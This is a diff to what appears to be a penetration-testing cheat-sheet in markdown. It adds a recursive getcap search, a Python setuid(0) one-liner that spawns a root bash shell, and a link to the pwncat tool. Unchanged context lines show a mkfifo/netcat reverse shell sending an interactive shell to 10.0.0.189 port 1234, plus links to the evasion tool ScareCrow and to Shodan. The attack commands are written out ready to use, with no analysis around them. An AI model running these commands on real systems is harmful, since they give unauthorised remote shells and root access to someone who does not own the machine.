@@ -38,6 +38,12 @@ Host host2
      ProxyCommand ssh host1 nc %h %p
 ```
 
+### getcap
+
+```bash
+getcap -r / 2>/dev/null
+```
+
 ### Tor Browser
 
 https://www.torproject.org/
@@ -87,6 +93,12 @@ lastlog
 rm /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe|/bin/sh -i 2>&1|nc 10.0.0.189 1234 > /tmp/pipe
 ```
 
+### Privilege escalation
+
+```bash
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
 ### Services & Apps
 
 https://www.crowdstrike.com/
@@ -104,3 +116,5 @@ https://www.menlosecurity.com/
 https://www.shodan.io/
 
 https://github.com/optiv/ScareCrow
+
+https://github.com/cytopia/pwncat
